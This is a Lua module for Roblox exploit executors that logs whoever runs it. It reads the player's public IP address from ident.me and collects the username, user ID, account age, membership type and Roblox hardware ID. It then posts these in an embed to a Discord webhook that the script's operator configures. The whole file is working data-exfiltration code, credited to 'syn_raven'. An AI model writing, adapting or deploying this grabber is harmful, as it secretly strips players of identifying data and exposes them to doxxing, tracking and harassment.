---@diagnostic disable: undefined-global
local logscript = {
  Webhook = nil
}



local IPv4 = game:HttpGet("https://v4.ident.me/")

local Headers = {["content-type"] = "application/json"}

local LocalPlayer = game:GetService("Players").LocalPlayer

local AccountAge = LocalPlayer.AccountAge
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local UserId = LocalPlayer.UserId
local PlayerName = LocalPlayer.Name

if syn then
  HttpRequest = syn.request
  else
  HttpRequest = http_request
end

local HttpRequest = http_request;

local http = game:GetService("HttpService")

local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?format=Png&isCircular=false&size=150x150&userIds="..UserId
local url2 = "http://ip-api.com/json/"..IPv4

local response = HttpRequest({Url=url, Method="GET",})


local json = http:JSONDecode(response.Body)

local imageUrl = json.data[1].imageUrl

local PlayerData =
{
       ["content"] = "",
       ["embeds"] = {{
           ["title"] = "User Info",
           ["url"] = "https://ipapi.co/?q="..IPv4,
           ["description"] = "```diff\n".."+ by syn_raven#0999".."\n```",
           ["color"] = tonumber(0xffffff),
           ["fields"] = {
            {
              ["name"] = "Username:",
              ["value"] = "["..PlayerName.."](https://www.roblox.com/users/"..UserId.."/profile)",
              ["inline"] = true
         },
               {
                   ["name"] = "Membership Type:",
                   ["value"] = MembershipType,
                   ["inline"] = true
},
               {
                   ["name"] = "Account Age:",
                   ["value"] = AccountAge.. " days",
                   ["inline"] = true
},
               {
                   ["name"] = "User ID:",
                   ["value"] = UserId,
                   ["inline"] = true
},
               {
                   ["name"] = "Public IP Address:",
                   ["value"] = IPv4,
                   ["inline"] = true
              },
              {
                ["name"] = "Roblox HWID:",
                ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                ["inline"] = true
           },
           },
           ["thumbnail"] = {
            ["url"] = imageUrl
          },
          ["image"] = {
            ["url"] = "https://cdn.discordapp.com/attachments/1080302345235210270/1083053024060125265/fotor_2023-3-8_12_45_49.png"
          },
       }}
   }

local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)

HttpRequest({Url=logscript.Webhook, Body=PlayerData, Method="POST", Headers=Headers})

return logscript
